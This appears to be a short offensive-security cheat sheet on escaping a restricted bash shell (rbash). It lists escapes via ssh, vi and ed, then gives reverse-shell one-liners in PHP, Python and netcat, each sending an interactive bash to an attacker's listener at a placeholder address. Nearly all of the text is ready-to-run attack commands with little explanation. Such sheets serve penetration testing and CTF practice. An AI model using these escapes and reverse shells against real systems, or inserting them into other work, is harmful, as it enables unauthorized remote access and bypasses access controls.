Get out of rbash
********************

check if the shell is rshell
##############################

.. code-block:: console

   echo $SHELL

rbash escape through ssh
###########################

We can escape the rbash through ssh by adding an extra argument.

.. code-block:: console

        ssh username@host/IP -t "bash --noprofile"

escape rbash through editors
###############################

vi
+++

You can escape rbash by opening the `vi` editor. We create a shell name variable and set our bash environment location.

.. code-block:: console

        vi
        :set shell=/bin/bash
        :shell
        export PATH=/bin:/usr/bin:$PATH

ed
++++

.. code-block:: console

   ed
   !'/bin/bash'
   pwd

escape rbash through reverse shell
#####################################

php
+++++

Attacker machine

.. code-block:: console

        nc -lvp 4545

victim machine

.. code-block:: console

   php -r '$sock=fsockopen("ip-address",port);exec("/bin/bash -i <&3 >&3 2>&3");'

python
++++++++++

attack machine

.. code-block:: console

        nc -lvp 4545

victim machine

.. code-block:: console

   python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ip-address",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'

netcat
+++++++

attack machine

.. code-block:: console

   nc -lvp port-number

victim machine

.. code-block:: console

   nc  ip-address port-number -e /bin/bash

https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/   
